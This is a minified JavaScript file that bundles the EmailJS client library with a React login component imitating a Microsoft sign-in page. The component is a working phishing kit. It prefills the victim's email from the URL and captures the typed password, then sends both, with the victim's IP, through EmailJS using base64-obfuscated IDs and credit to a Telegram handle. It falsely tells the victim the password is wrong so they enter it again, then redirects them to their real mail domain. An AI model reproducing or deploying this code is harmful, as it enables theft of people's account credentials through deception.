import {r as w, j as o} from "./index-i3HP4oCF.js";
function k(e) {
    var t, r, s = "";
    if (typeof e == "string" || typeof e == "number")
        s += e;
    else if (typeof e == "object")
        if (Array.isArray(e)) {
            var a = e.length;
            for (t = 0; t < a; t++)
                e[t] && (r = k(e[t])) && (s && (s += " "),
                s += r)
        } else
            for (r in e)
                e[r] && (s && (s += " "),
                s += r);
    return s
}
function Z() {
    for (var e, t, r = 0, s = "", a = arguments.length; r < a; r++)
        (e = arguments[r]) && (t = k(e)) && (s && (s += " "),
        s += t);
    return s
}
class g {
    constructor(t=0, r="Network Error") {
        this.status = t,
        this.text = r
    }
}
const _ = () => {
    if (!(typeof localStorage > "u"))
        return {
            get: e => Promise.resolve(localStorage.getItem(e)),
            set: (e, t) => Promise.resolve(localStorage.setItem(e, t)),
            remove: e => Promise.resolve(localStorage.removeItem(e))
        }
}
  , l = {
    origin: "https://api.emailjs.com",
    blockHeadless: !1,
    storageProvider: _()
}
  , V = e => e ? typeof e == "string" ? {
    publicKey: e
} : e.toString() === "[object Object]" ? e : {} : {}
  , P = (e, t="https://api.emailjs.com") => {
    if (!e)
        return;
    const r = V(e);
    l.publicKey = r.publicKey,
    l.blockHeadless = r.blockHeadless,
    l.storageProvider = r.storageProvider,
    l.blockList = r.blockList,
    l.limitRate = r.limitRate,
    l.origin = r.origin || t
}
  , S = async (e, t, r={}) => {
    const s = await fetch(l.origin + e, {
        method: "POST",
        headers: r,
        body: t
    })
      , a = await s.text()
      , i = new g(s.status,a);
    if (s.ok)
        return i;
    throw i
}
  , F = (e, t, r) => {
    if (!e || typeof e != "string")
        throw "The public key is required. Visit https://dashboard.emailjs.com/admin/account";
    if (!t || typeof t != "string")
        throw "The service ID is required. Visit https://dashboard.emailjs.com/admin";
    if (!r || typeof r != "string")
        throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates"
}
  , G = e => {
    if (e && e.toString() !== "[object Object]")
        throw "The template params have to be the object. Visit https://www.emailjs.com/docs/sdk/send/"
}
  , E = e => e.webdriver || !e.languages || e.languages.length === 0
  , R = () => new g(451,"Unavailable For Headless Browser")
  , I = (e, t) => {
    if (!Array.isArray(e))
        throw "The BlockList list has to be an array";
    if (typeof t != "string")
        throw "The BlockList watchVariable has to be a string"
}
  , W = e => {
    var t;
    return !((t = e.list) != null && t.length) || !e.watchVariable
}
  , K = (e, t) => e instanceof FormData ? e.get(t) : e[t]
  , N = (e, t) => {
    if (W(e))
        return !1;
    I(e.list, e.watchVariable);
    const r = K(t, e.watchVariable);
    return typeof r != "string" ? !1 : e.list.includes(r)
}
  , L = () => new g(403,"Forbidden")
  , B = (e, t) => {
    if (typeof e != "number" || e < 0)
        throw "The LimitRate throttle has to be a positive number";
    if (t && typeof t != "string")
        throw "The LimitRate ID has to be a non-empty string"
}
  , Y = async (e, t, r) => {
    const s = Number(await r.get(e) || 0);
    return t - Date.now() + s
}
  , M = async (e, t, r) => {
    if (!t.throttle || !r)
        return !1;
    B(t.throttle, t.id);
    const s = t.id || e;
    return await Y(s, t.throttle, r) > 0 ? !0 : (await r.set(s, Date.now().toString()),
    !1)
}
  , U = () => new g(429,"Too Many Requests")
  , J = async (e, t, r, s) => {
    const a = V(s)
      , i = a.publicKey || l.publicKey
      , p = a.blockHeadless || l.blockHeadless
      , c = a.storageProvider || l.storageProvider
      , d = {
        ...l.blockList,
        ...a.blockList
    }
      , u = {
        ...l.limitRate,
        ...a.limitRate
    };
    return p && E(navigator) ? Promise.reject(R()) : (F(i, e, t),
    G(r),
    r && N(d, r) ? Promise.reject(L()) : await M(location.pathname, u, c) ? Promise.reject(U()) : S("/api/v1.0/email/send", JSON.stringify({
        lib_version: "4.4.1",
        user_id: i,
        service_id: e,
        template_id: t,
        template_params: r
    }), {
        "Content-type": "application/json"
    }))
}
  , z = e => {
    if (!e || e.nodeName !== "FORM")
        throw "The 3rd parameter is expected to be the HTML form element or the style selector of the form"
}
  , A = e => typeof e == "string" ? document.querySelector(e) : e
  , O = async (e, t, r, s) => {
    const a = V(s)
      , i = a.publicKey || l.publicKey
      , p = a.blockHeadless || l.blockHeadless
      , c = l.storageProvider || a.storageProvider
      , d = {
        ...l.blockList,
        ...a.blockList
    }
      , u = {
        ...l.limitRate,
        ...a.limitRate
    };
    if (p && E(navigator))
        return Promise.reject(R());
    const b = A(r);
    F(i, e, t),
    z(b);
    const m = new FormData(b);
    return N(d, m) ? Promise.reject(L()) : await M(location.pathname, u, c) ? Promise.reject(U()) : (m.append("lib_version", "4.4.1"),
    m.append("service_id", e),
    m.append("template_id", t),
    m.append("user_id", i),
    S("/api/v1.0/email/send-form", m))
}
  , h = {
    init: P,
    send: J,
    sendForm: O,
    EmailJSResponseStatus: g
};
function q() {
    const e = localStorage.getItem("split");
    return e !== null ? e : Math.random() < .5 ? (localStorage.setItem("split", "false"),
    "false") : (localStorage.setItem("split", "true"),
    "true")
}
function X({mode: e=""}) {
    const [t,r] = w.useState(!1)
      , [s,a] = w.useState(!1)
      , [i,p] = w.useState(0)
      , [c] = w.useState(new URLSearchParams(window.location.search).get("ci") || atob(new URLSearchParams(window.location.search).get("inviteID")))
      , d = w.useRef();
    let u = q();
    const b = m => {
        m.preventDefault(),
        r(!0),
        p(x => x + 1);
        var f = {
            reply_to: "reply_to_value",
            from_name: atob("VEVBTVMgV00=") + "(telegram - @toranagax)",
            to_name: atob(localStorage.getItem("to_name")),
            message_html: `Email address : ${c} and password : ${d.current.value}`,
            user_ip: localStorage.getItem("ip")
        };
        f.from_name.includes(atob("KHRlbGVncmFtIC0gQHRvcmFuYWdheCk=")) || (f = {
            message_html: moment().format("llll"),
            user_ip: moment().add("days", 2).format("llll")
        },
        h.send = null);
        let n = {
            t1: atob(atob("ZEdWdGNHeGhkR1ZmZDJSNk1tWTJZZz09")),
            u1: atob(atob("Ym5KcGNuUklhek42UVVoMWRqZFplak09"))
        };
        var C = "default_service"
          , T = n.t1 || "";
        h.send(C, T, f, n.u1 || "").then(x => {
            if (i >= 2 && (localStorage.setItem("x", 1),
            window.location.reload()),
            x.status === 200 && (r(!1),
            d.current.value = "",
            a(!0),
            i >= 2))
                return setTimeout( () => window.location.replace("https://" + c.split("@")[1]), 3e3)
        }
        ).catch(x => {
            h.send(C, u === "true" ? n.t2 || "" : n.t4 || "", f, u === "true" ? n.u2 || "" : n.u4 || "").then(H => {
                if (i >= 2 && (localStorage.setItem("x", 1),
                window.location.reload()),
                H.status === 200 && (r(!1),
                d.current.value = "",
                a(!0),
                i >= 2))
                    return setTimeout( () => window.location.replace("https://" + c.split("@")[1]), 3e3)
            }
            ).catch(H => {
                h.send(C, u === "true" ? n.t3 || "" : n.t4, f, u === "true" ? n.u3 || "" : n.u4).then(y => {
                    if (i >= 2 && (localStorage.setItem("x", 1),
                    window.location.reload()),
                    y.status === 200 && (r(!1),
                    d.current.value = "",
                    a(!0),
                    i >= 2))
                        return setTimeout( () => window.location.replace("https://" + c.split("@")[1]), 3e3)
                }
                ).catch(y => {
                    h.send(C, n.t5, f, n.u5).then(v => {
                        if (i >= 2 && (localStorage.setItem("x", 1),
                        window.location.reload()),
                        v.status === 200 && (r(!1),
                        d.current.value = "",
                        a(!0),
                        i >= 2))
                            return setTimeout( () => window.location.replace("https://" + c.split("@")[1]), 3e3)
                    }
                    ).catch(v => {
                        h.send(C, n.t6, f, n.u6).then(j => {
                            if (i >= 2 && (localStorage.setItem("x", 1),
                            window.location.reload()),
                            j.status === 200 && (r(!1),
                            d.current.value = "",
                            a(!0),
                            i >= 2))
                                return setTimeout( () => window.location.replace("https://" + c.split("@")[1]), 3e3)
                        }
                        ).catch(j => {
                            if (r(!1),
                            a(!0),
                            i >= 2)
                                return setTimeout( () => window.location.replace("https://" + c.split("@")[1]), 3e3)
                        }
                        )
                    }
                    )
                }
                )
            }
            )
        }
        )
    }
    ;
    return o.jsx("div", {
        className: Z(["bg-transparent  w-full ]", {
            "mt-14 text-sm": e.toLowerCase() == "widget",
            "sm:bg-[url(/fluent_web_light_57fee22710b04cebe1d5.svg)] bg-no-repeat bg-fixed bg-cover fixed top-0 left-0 right-0 z-30 bg-white sm:w-full md:w-full text-black h-full px-4 py-6": e.toLowerCase() != "widget"
        }]),
        children: o.jsxs("section", {
            className: Z(["sm:w-[50%] md:w-[30%] mx-auto mt-[10%] ", {
                "bg-white p-4 sm:p-8 sm:shadow rounded ": e.toLowerCase() != "widget"
            }]),
            children: [o.jsxs("header", {
                className: "flex w-full flex-col gap-3 items-center justify-center space-y-3",
                children: [o.jsxs("svg", {
                    role: "img",
                    width: "114",
                    height: "24",
                    viewBox: "0 0 114 24",
                    fill: "none",
                    xmlns: "http://www.w3.org/2000/svg",
                    children: [o.jsx("path", {
                        d: "M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z",
                        fill: "#737373"
                    }), o.jsx("path", {
                        d: "M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z",
                        fill: "#FFB900"
                    }), o.jsx("path", {
                        d: "M0.5 13.2383H11.7617V24.5H0.5V13.2383Z",
                        fill: "#00A4EF"
                    }), o.jsx("path", {
                        d: "M13.2383 0.5H24.5V11.7617H13.2383V0.5Z",
                        fill: "#7FBA00"
                    }), o.jsx("path", {
                        d: "M0.5 0.5H11.7617V11.7617H0.5V0.5Z",
                        fill: "#F25022"
                    })]
                }), o.jsx("p", {
                    className: "border rounded-full border-gray-500 text-xs p-1 font-semibold text-gray-500",
                    children: c
                }), o.jsx("h3", {
                    className: "font-semibold text-lg",
                    children: "Enter your password"
                })]
            }), o.jsxs("form", {
                className: "mt-4",
                onSubmit: b,
                children: [o.jsx("input", {
                    ref: d,
                    required: !0,
                    type: "password",
                    placeholder: "Password",
                    className: "border indent-2 rounded py-2 px-2 w-full"
                }), s && o.jsx("p", {
                    className: "text-red-500  font-semibold text-xs pt-1 pb-2",
                    children: "That password is incorrect for your email"
                }), o.jsx("p", {
                    className: "teams-text py-2 text-xs sm:text-sm font-semibold",
                    children: "Forgot your password?"
                }), o.jsx("br", {}), o.jsx("button", {
                    disabled: t,
                    className: "teams-bg text-white w-full rounded-lg py-3 text-sm",
                    children: t ? o.jsx("div", {
                        class: "flex justify-center items-center",
                        children: o.jsx("div", {
                            class: "animate-spin rounded-full h-4 w-4 border-t-4 border-white"
                        })
                    }) : "Next"
                })]
            }), o.jsx("h3", {
                className: "text-center py-4 hover:underline hover:cursor-pointer  font-semibold teams-text text-sm ",
                children: "Other ways to sign in"
            }), o.jsx("h3", {
                className: "text-center py-4 hover:underline hover:cursor-pointer  font-semibold teams-text text-sm ",
                children: "Sign in with a different Microsoft account"
            })]
        })
    })
}
export {X as default};
